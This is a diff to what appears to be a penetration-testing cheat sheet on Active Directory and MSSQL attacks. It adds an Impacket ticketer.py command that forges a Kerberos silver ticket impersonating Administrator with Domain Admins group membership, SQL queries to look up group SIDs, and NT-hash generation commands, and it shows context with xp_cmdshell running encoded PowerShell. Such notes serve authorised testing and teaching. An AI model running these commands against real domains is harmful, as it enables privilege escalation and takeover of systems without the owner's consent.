@@ -226,14 +226,25 @@ exec xp_cmdshell 'powershell -enc <encoded_raw_code>'
 - Grants access to only that specific service
 - Like having a key to one room, not the whole building
 
+<img width="1199" height="512" alt="image" src="https://github.com/0xmrsecurity/0xmrsecurity.github.io/blob/main/assets/img/posts/Screenshot%202026-02-07%20232402.png" />
+
+```bash
+ticketer.py -nthash $nthash -domain-sid $Domain_SID -domain $Domain -spn $user/$Full_DOmain:$Port -groups 512,513 -user-id 500 Administrator
+```
+
+### Get Groups SID
+```bash
+select SUSER_SID('$Domain\Domain Admins')
+select SUSER_SNAME(SID_BINARY(N'put raw'))
+```
+
 ### Generate Nthash
 ```bash
 └─# python3
 >>> import hashlib
 >>> hashlib.new('md4', 'password_here'.encode('utf-16le')).digest().hex()
-```
-```bash
-ticketer.py -nthash $nthash -domain-sid $sid -domain $Domain -spn $user/$Full_DOmain:$Port -user-id 500 Administrator
+
+echo -n 'password_here' | iconv -t utf-16le | openssl md4 -provider legacy
 ```
 ```bash
 export KRB5CCNAME=Administrator.ccache
